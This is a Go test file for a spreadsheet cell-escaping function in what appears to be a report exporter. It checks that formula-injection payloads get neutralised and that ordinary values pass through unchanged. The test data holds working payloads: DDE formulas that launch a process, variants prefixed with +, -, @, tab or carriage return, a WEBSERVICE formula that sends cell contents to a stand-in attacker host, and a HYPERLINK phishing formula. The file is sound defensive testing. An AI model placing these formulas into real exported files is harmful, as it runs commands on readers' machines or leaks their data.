package safe

import (
	"strings"
	"testing"
)

// TestFormulaInjection is the test the phase file names by name.
//
// ⚠ THE PAYLOADS HERE ARE REAL. Each one executes, or exfiltrates, when a
// spreadsheet opens a file containing it in an unescaped cell.
func TestFormulaInjection(t *testing.T) {
	payloads := []struct {
		name  string
		value string
		why   string
	}{
		{
			name:  "DDE process launch",
			value: `=cmd|'/c calc'!A1`,
			why:   "launches a process on open — the canonical payload",
		},
		{
			name:  "plus-prefixed DDE",
			value: `+cmd|'/c calc'!A1`,
			why:   "`+` starts a formula just as `=` does",
		},
		{
			name:  "minus-prefixed formula",
			value: `-1+1+cmd|'/c calc'!A1`,
			why:   "`-1+1` parses as a formula, so `-` is a formula start",
		},
		{
			name:  "at-prefixed function",
			value: `@SUM(1+1)*cmd|'/c calc'!A1`,
			why:   "`@` introduces a function in older Excel and in LibreOffice",
		},
		{
			name:  "exfiltration via WEBSERVICE",
			value: `=WEBSERVICE("http://attacker.invalid/"&A1)`,
			why:   "sends cell contents to an attacker without launching anything",
		},
		{
			name:  "hyperlink phishing",
			value: `=HYPERLINK("http://attacker.invalid","Click for report")`,
			why:   "renders as trustworthy text inside a document the customer trusts",
		},
		{
			name:  "tab shifts the parse",
			value: "\t=cmd|'/c calc'!A1",
			why:   "a leading TAB can move the parse into the next cell",
		},
		{
			name:  "carriage return",
			value: "\r=cmd|'/c calc'!A1",
			why:   "same as TAB, via a different separator",
		},
	}

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			got := Cell(tc.value)

			if !strings.HasPrefix(got, prefix) {
				t.Fatalf("payload was NOT escaped: %q -> %q\nwhy it matters: %s",
					tc.value, got, tc.why)
			}
			// The original value must survive intact behind the quote — an
			// escaping that mangles the data would make the report wrong in
			// order to make it safe.
			if got != prefix+tc.value {
				t.Fatalf("escaping altered the value: %q -> %q", tc.value, got)
			}
			if !IsDangerous(tc.value) {
				t.Fatalf("IsDangerous did not flag %q", tc.value)
			}
		})
	}
}

// TestOrdinaryValuesAreUntouched guards against the other failure: escaping so
// aggressively that every cell gains a stray quote, which is how an escaping
// rule gets removed by the next person who reads a report.
func TestOrdinaryValuesAreUntouched(t *testing.T) {
	safe := []string{
		"lodash",
		"4.17.21",
		"pkg:npm/lodash@4.17.21",
		"Apache-2.0",
		"MIT OR Apache-2.0",
		"CVE-2021-44228",
		"not-provided",
		"github.com/Masterminds/semver/v3",
		"", // empty stays empty rather than becoming a lone quote
		"A component with = in the middle",
		"1.0.0-rc.1",
	}

	for _, value := range safe {
		if got := Cell(value); got != value {
			t.Errorf("ordinary value was altered: %q -> %q", value, got)
		}
		if IsDangerous(value) {
			t.Errorf("ordinary value flagged as dangerous: %q", value)
		}
	}
}

// TestEveryDangerousLeadingCharacter is exhaustive over the documented set, so
// removing one from `dangerous` fails here rather than silently shipping.
func TestEveryDangerousLeadingCharacter(t *testing.T) {
	for _, char := range dangerous {
		value := string(char) + "payload"
		if got := Cell(value); !strings.HasPrefix(got, prefix) {
			t.Errorf("leading %q was not escaped", char)
		}
	}
}

func TestCellsEscapesAWholeRow(t *testing.T) {
	row := []string{"lodash", `=cmd|'/c calc'!A1`, "4.17.21"}
	got := Cells(row)

	if got[0] != "lodash" || got[2] != "4.17.21" {
		t.Errorf("ordinary cells were altered: %q", got)
	}
	if !strings.HasPrefix(got[1], prefix) {
		t.Errorf("the hostile cell in the row was not escaped: %q", got[1])
	}
	if len(got) != len(row) {
		t.Errorf("row length changed: %d -> %d", len(row), len(got))
	}
}

// TestEscapingIsIdempotent matters because a value may pass through more than
// one writer. Escaping twice would put two quotes in front of a name and make
// the report wrong.
func TestEscapingIsIdempotent(t *testing.T) {
	once := Cell(`=cmd|'/c calc'!A1`)
	twice := Cell(once)
	if once != twice {
		t.Errorf("escaping is not idempotent: %q -> %q", once, twice)
	}
}

// TestUnicodeIsNotCorrupted — a component name can be any UTF-8, and indexing
// by byte is how a multi-byte first character gets split.
func TestUnicodeIsNotCorrupted(t *testing.T) {
	values := []string{"пакет", "パッケージ", "📦-package", "café"}
	for _, value := range values {
		if got := Cell(value); got != value {
			t.Errorf("unicode value was altered: %q -> %q", value, got)
		}
	}
}
